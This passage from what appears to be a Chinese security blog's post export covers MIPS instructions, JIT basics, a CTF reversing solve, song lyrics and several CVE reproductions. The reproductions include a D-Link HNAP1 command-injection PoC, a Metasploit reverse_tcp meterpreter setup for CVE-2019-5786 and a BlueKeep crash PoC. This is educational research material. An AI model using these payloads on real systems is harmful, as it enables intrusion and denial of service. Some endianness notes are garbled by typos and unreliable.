存器复制到浮点寄存器|\n|MTC1|把一个数据从浮点寄存器复制到定点寄存器|\n|LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零|\n|DSLL|双字逻辑左移|\n|DSRL|双字逻辑右移|\n|DSRA|双字算术右移|\n|DSLLV|可变的双字逻辑左移|\n|DSRLV|可变的双字逻辑右移|\n|DSRAV|可变的双字算术右移|\n|SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0|\n|SLTI|r2的值小于立即数，则r1为1，否则为0|\n|SLTU|=SLT带符号|\n|SLTUI|=SLT不带符号|\n|MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器|\n|MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器|\n|TRAP|根据地址向量转入管态|\n|ERET|从异常中返回到用户态|\n|MADD.S|一个双浮点数与单浮点数相乘加，结果为单|\n|MADD.D|一个双浮点数与单浮点数相乘加，结果为双|\n|MADD.PS|两个单浮点数相乘加，结果为单|\n\n### 大端序小端序复习\n字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关，\n\n大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。\n\n","categories":[],"tags":["IOT"]},{"title":"Loving strangers","url":"/posts/15058/","content":"\n\n你爱的人是我杀的，不爱你是假的，想忘了你是真的    \n\n\n如果我有枪我会保护你，也会杀了你，但我把枪丢了，踉踉跄跄的跑到你面前说我害怕\n\n\n```\nLoving strangers ×3\n\n爱上了陌生人\n\nAhah\n\nLoving strangers ×3\n\n爱上了陌生人\n\nAh\n\nI’ve got a hole, oh in my pocket\n\n我口袋破了一个洞\n\nwhere all the money has gone\n\n钱都从那里消失了\n\nI’ve got a whole lot of work to do with your heart\n\n我想经常存在于你的心里\n\nCuz it’s so busy, mine’s not\n\n因为你的心很忙，我的心却很悠闲\n\nLoving strangers ×3\n\n爱上陌生人\n\nAhah\n\nLoving strangers ×3\n\n爱上陌生人\n\nAh\n\nIt’s just the start of the winter\n\n那是冬天的开始的季节\n\nAnd I’m all alone\n\n我独自一人\n\nBut I’ve got my eye right on you\n\n我所有的目光全都在你身上\n\nGive me a coin\n\n给我一枚硬币\n\nAnd I'll take you to the moon\n\n我将带你去往月球\n\nNow give me a beer\n\n现在请给我一杯啤酒\n\nAnd I’ll kiss you so foolishly\n\n我将像个呆瓜一样吻你\n\nlike you do when you lie, when you’re not in my thoughts\n\n你说谎的时候，不会站在我的视角考虑\n\nlike you do when you lie\n\n当你说谎的时候\n\nAnd I know it’s not my imagination\n\n我知道那不是我的幻想\n\nLoving strangers ×3\n\n爱啊，陌生人\n\nAhah\n\n爱啊\n\nLoving strangers ×3\n\n爱上一个陌生人\n\nAh\n\n啊哈\n\nLoving strangers ×3\n\n爱啊，陌生人\n\nNahnahnah\n\nLoving strangers ×3\n\n爱上了一个陌生人\n\nAhah...\n\nAh...\n\nAh...\n```","categories":[],"tags":["mood"]},{"title":"JIT 学习","url":"/posts/17972/","content":"## JIT原理\nJust In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。\n\n还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。\n## 技术点\n从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。\n\n例子：\n\n```\n #include<stdio.h>\nint inc(int a) {\n    return a + 1;\n}\nint main() {\n    printf(\"%d\\n\", inc(3));\n    return 0;\n}\n```\n\n`objdump -d 1`查看它的机器码。\n\n```\n0000000000400526 <inc>:\n  400526:\t55                   \tpush   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器\n  400527:\t48 89 e5             \tmov    %rsp,%rbp\n  40052a:\t89 7d fc             \tmov    %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3\n  40052d:\t8b 45 fc             \tmov    -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中\n  400530:\t83 c0 01             \tadd    $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递\n  400533:\t5d                   \tpop    %rbp\n  400534:\tc3                   \tretq   \n```\n\n我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：\n\n```\n #include<stdio.h>\n #include<memory.h>\n #include<sys/mman.h>\ntypedef int (* inc_func)(int a); \nint main() {\n    char code[] = { \n        0x55,             // push rbp\n        0x48, 0x89, 0xe5, // mov rsp, rbp\n        0x89, 0xf8,       // mov edi, eax\n        0x83, 0xc0, 0x01, // add $1, eax\n        0x5d,             // pop rbp\n        0xc3              // ret\n    };  \n    void * temp = mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC,\n            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); \n    memcpy(temp, code, sizeof(code));\n    inc_func p_inc = (inc_func)temp;\n    printf(\"%d\\n\", p_inc(7));\n    return 0;\n}\n```\n\nmmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。\n\n我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。\n","categories":[],"tags":["chrome知识点"]},{"title":"Dlink DIR-823G 漏洞挖掘过程","url":"/posts/39342/","content":"\n固件下载地址： https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA 提取码：1ly1\n\n# 0x01 漏洞介绍\n<b>D-Link DIR-823G命令注入漏洞：</b>\n\nCVE编号：CVE-2019-15529\n\nD-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 \n\n# 0x02 分析\n* binwalk -Me 固件.bin //解开固件\n\n\n![捕获.PNG](https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png)\n\n是一个squashfs文件系统，标准linux目录结构。\n\n* cat /etc/init.d/rcS //查看路由器开启的服务。\n\n发现一个goahead进程。\n\n> GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。\n> `websUrlHandlerDefine(T(\"/goform\"), NULL, 0, websFormHandler, 0);` /goform的请求交给websFormHandler函数处理\n> `websUrlHandlerDefine(T(\"/cgi-bin\"), NULL, 0, websCgiHandler, 0);` /cgi-bin的请求交给websCgiHandler函数处理。\n\n## 模拟运行固件\n环境使用工具firmware-ayalysis-toolkit。\n\n搭建教程：https://zhuanlan.zhihu.com/p/110806057\n\n运行起来后nmap扫端口，发现开了http服务和dns服务。\n\n访问http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。\n\n![捕获.PNG](https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png)\n\n在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。\n## 未授权访问\n<b>`/cgi-bin/ExportSettings.sh` 导出配置文件，造成信息泄露。</b>\n\n\n![捕获.PNG](https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png)\n\n\n<b>`/cgi-bin/upload_settings.cgi` 导入配置文件，可导入恶意篡改后的配置。</b>\n\n\n![捕获.PNG](https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png)\n\n\n<b>`/cgi-bin/GetDownLoadSyslog.sh` 获取系统部分启动信息`/var/log/messages*`</b>\n\n\n![捕获.PNG](https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png)\n\n\n<b>`/cgi-bin/upload_firmware.cgi` 上传更新固件，可恶意修改固件</b>\n\n## goahead 自定义的请求处理函数\n> 处理函数的参数列表：\n> int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t *path, char_t* query)\n> goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以\"/goform\"开始的URLs。紧跟着\"goform\"之后的字符串定义了表单名字和用户请求的细节.\n\nIDA打开goahead分析：\n\n通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C.\n\n![捕获.PNG](https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png)\n\nwebsUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。\n\n抓取登录数据包，发现往/HNAP1发送。\n\n\n![捕获.PNG](https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png)\n\n\n分析/HNAP1（0x42383C）处理函数逻辑:\n\n\n![捕获.PNG](https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png)\n\n从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。\n\n找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。\n\n\n![捕获.PNG](https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png)\n\n\n此处可以直接注入'来命令执行。\n\n> 在PHP中常用到以下几个函数来执行外部命令:\n> system\n>> system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能\n>\n> exec\n> passthru\n> shell_exec\n\n## POC\n\n```\nPOST /HNAP1/ HTTP/1.1\nHost: 192.168.0.1\nContent-Length: 53\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\nContent-Type: text/xml; charset=UTF-8\nAccept: */*\nSOAPAction: \"http://purenetworks.com/HNAP1/Login\"\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n'`echo hacked_by_hac425!!!!!!!! > /web_mtn/hack.txt`'\n```\n\n","categories":[],"tags":["IOT"]},{"title":"DDCTF RE windows_re2","url":"/posts/2874/","content":"esp定律脱壳Aspack，然后ida分析一波。\n\n```\nint sub_401320()\n{\n  char v1; // [esp+8h] [ebp-C04h]\n  char v2; // [esp+9h] [ebp-C03h]\n  char v3; // [esp+408h] [ebp-804h]\n  char v4; // [esp+409h] [ebp-803h]\n  char v5; // [esp+808h] [ebp-404h]\n  char v6; // [esp+809h] [ebp-403h]\n  v3 = 0;\n  sub_401C6A(&v4, 0, 0x3FF);\n  v5 = 0;\n  sub_401C6A(&v6, 0, 0x3FF);\n  MEMORY[0x785520C1](\"input code:\");\n  MEMORY[0x785526D4](\"%s\", &v3);\n  if ( !(unsigned __int8)sub_4011F0() )\n  {\n    MEMORY[0x785520C1](\"invalid input\\n\");\n    MEMORY[0x78542455](0);\n  }\n  sub_401240(&v5);\n  v1 = 0;\n  sub_401C6A(&v2, 0, 0x3FF);\n  MEMORY[0x78552E73](&v1, \"DDCTF{%s}\", &v5);\n  if ( !strcmp(&v1, \"DDCTF{reverse+}\") )\n    MEMORY[0x785520C1](\"You've got it !!! %s\\n\", &v1);\n  else\n    MEMORY[0x785520C1](\"Something wrong. Try again...\\n\");\n  return 0;\n}\n```\n\n* 限制输入0-9,A-F,可想到十六进制\n* 输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。\n\n先尝试输入字符串`1234567AAA`,得到加密后字符 `EjRWeqo=`,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。\n将`reverse+`转换得到flag\n\n","categories":[],"tags":["RE"]},{"title":"CVE-2020-6418","url":"/posts/4681/","content":"\n# 背景\n(资料来自绿盟科技)\n\n2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.\n\nCVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。\n\n受影响产品版本：\n\nGoogle Chrome Version<80.0.3987.122\n\n适用于windows,Mac,Linux.\n\n\n\n\n\n\n\n\n\n### 参考\nhttp://blog.nsfocus.net/cve-2020-6418","categories":[],"tags":["chrome调试"]},{"title":"CVE-2019-5786","url":"/posts/23309/","content":"\n前言：\n\n这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！\n\n## 环境\n\nkali\nwin7_x86\nGoogle_chrome_(32bit)_v72.0.3626.119\n\n浏览下载链接推荐：https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe\n\n## 复现：\n\nkali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)\n\n`root@kali:~# msfconsole -q`\n\n`msf5 > search chrome_filereader`\n\n> 注：\n> 1.`msfconsole -q`  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。\n> 2.`search chrome_filereader`正则匹配搜索exp。exp存在则浮现。\n> 3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”\n\n出现exp: `exploit/filereader/browser/chrome_filereader_uaf`\n\n\n![捕获.PNG](https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png)\n\n\n\n### 简单了解FileReader对象的用法\n\nFilereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取\n* readyState：表示读取状态\n\t* empty,0,尚未读取\n\t* loading,1,正在读取\n\t* done,2,读取完成\n\n* result：表示读取结果，具体格式与读取方式有关：\n\t* readAsArrayBuffer\n\t* readAsBinaryString\n\t* readAsDataURL\n\t* readAsText\n\n* onprogress：回调函数\n\t* 读取Blob触发\n\t* 当数据较多时会周期性触发多次\n\n* onloadend：回调函数\n\t* 读取操作完成时触发，不论读取成功或失败\n\n查看模块信息\n\n\n![捕获.PNG](https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png)\n\n\n漏洞介绍：\n\n```Payload information:\nDescription:\n  This exploit takes advantage of a use after free vulnerability in \n  Google Chrome 72.0.3626.119 running on Windows 7 x86. The \n  FileReader.readAsArrayBuffer function can return multiple references \n  to the same ArrayBuffer object, which can be freed and overwritten \n  with sprayed objects. The dangling ArrayBuffer reference can be used \n  to access the sprayed objects, allowing arbitrary memory access from \n  Javascript. This is used to write and execute shellcode in a \n  WebAssembly object. The shellcode is executed within the Chrome \n  sandbox, so you must explicitly disable the sandbox for the payload \n  to be successful.```\n\n选择payload\n`-> set payload windows/meterpreter/reverse_tcp`\n> 注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”\n\n设置payload参数：LHOST为kali ip\n`-> set LHOST 192.168.119.128 `\n\n\n![捕获.PNG](https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png)\n\n\n创建服务 `-> set payload windows/meterpreter/reverse_tcp`\n\n\n![捕获.PNG](https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png)\n\n启动服务：run 或者exploit\n\n在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe\n`-> chrome.exe --no-sandbox`\n\n在弹出的chome浏览器中访问kali ip:\nhttp://192.168.119.128:8080\n\nkali获得sessions\n查看sessions序号，通过反弹shell在win7上可执行命令。\n复现结束。\n\n### 后记\n\n在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.\n虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……\n\n### EXP\n\nexp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。\n\nhttps://github.com/exodusintel/CVE-2019-5786 \n\n\n\n\n","categories":[],"tags":["chrome_bug"]},{"title":"CVE-2019-0808","url":"/posts/37051/","content":"\nChrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo），其中渲染进程运行着不可信的HTML和JS代码。浏览器中的每一个tab为一个独立的进程，运行在Untruster的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。\n* 利用浏览器进程的漏洞，比如IndexedDB,Mojo等\n* 利用操作系统内核漏洞，比如与CVE-2019-5768组合的win32k.sys内核提权漏洞CVE-2019-0808\n\n## 漏洞原理分析\n\nCVE-2019-0808是win32k.sys中的一个空指针解引用漏洞，根据360Blog,漏洞存在于win32k!xxxMNMouseMove函数中：\n\n首先分析xxxMNMouseMove函数：\n\n","categories":[],"tags":["chrome_bug"]},{"title":"CVE-2019-0708","url":"/posts/37771/","content":"\n2019年5月14日爆出CVE-2019-0708漏洞，高危漏洞，影响范围较广，通过远程桌面端口3389，RDP协议进行攻击。\n\n影响系统：windows 2003、windows 2008、windows 2008 R2、windows xp、win7\n\n# 蓝屏\n## 环境\n\n攻击机：kali IP：192.168.119.128\n\n靶机：win7 IP:192.168.119.139 (开放3389端口)\n\n工具：RDP漏洞扫描工具、MSF\n\nPOC：https://github.com/n1xbyte/CVE-2019-0708\n\n## 复现\n\nnmap对win7端口扫描:\n\n\n![nmap扫描3389.PNG](https://i.loli.net/2020/07/13/Agj1dU2GY5JKZnW.png)\n\nRDP工具在win7上扫描靶机:`0708detector.exe -t 192.168.119.139 -p 3389`\n\n\n![漏扫工具扫描3389（win7自身）.PNG](https://i.loli.net/2020/07/13/CwHJ1PRnel7cyu5.png)\n\n启动MSF\n查找漏洞： `search 0708`\n\n利用漏洞扫描模块： `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`\n\n查看参数： `show options`\n\n设置靶机IP： `set rhosts 192.168.119.139`\n\n运行：`run`\n\n### 漏洞攻击\n\n\n在kali中安装pip3,安装impacket库。下载poc。\n切进目录CVE-2019-0708\n\n开始攻击： `python3 crashpoc.py 192.168.119.139 64(系统类型)`\n\n攻击成功，win7变为蓝屏。\n\n\n![win7蓝屏.PNG](https://i.loli.net/2020/07/13/UN9urvOaMQxEDoC.png)\n\n## 知识点\n\n#### RDP协议\n\nRDP,远程显示协议。传输方式：tcp/ip。提供了客户和服务器之间的连接。映像会话。\n基本层次结构：\n* 网络连接层：RDP协议建立在tcp/ip协议之上，由于传输的数据量比较大，因此在协议的底层首先定义一层网络连接层，它定义了一个完整的RDP数据逻辑包，以避免由于网络包长度过长而被分割使数据丢失。\n* ISO数据层：在网络连接层之上是ISO数据层，标识RDP数据的正常连接通信。\n* 虚拟通道层：在ISO数据层之上，RDP协议定义一个虚拟通道层，用以拆分标示不同虚拟通道的数据，加快客户端处理速度，节省占用网络接口的时间。\n* 加密解密层：在虚拟通道层之上，RDP定义一个数据加密解密层，此层用于对所有的功能数据进行加密解密处理。\n* 功能数据层：在加密解密层之上是功能数据，画面信息，本地资源转换，声音数据，打印数据等所有的功能数据信息都在此层进行处理。另外，根据数据类型的不同，这些数据都有各自不同层次的分割，\n\n连接过程说明：\n* 客户端连接服务器\n* ISO数据层建立连接\n* 发送初始协议相关信息，接收加密、解密秘钥\n* 虚拟通道申请\n* 加密形式发送客户端系统信息，同时验证加密协议\n* 平台软件证书验证\n* 各功能建立连接，各功能数据传输，功能实现。","categories":[],"tags":["windows漏洞"]},{"title":"CVE-2006-3439","url":"/posts/55466/","content":"","categories":[],"tags":[]},{"title":"Chrome 调试篇 1 CVE-2019-5768","url":"/posts/7456/","content":"\n# 漏洞产生原因分析\n\n#### FileReader\n","categories":[],"tags":["chrome调试"]}]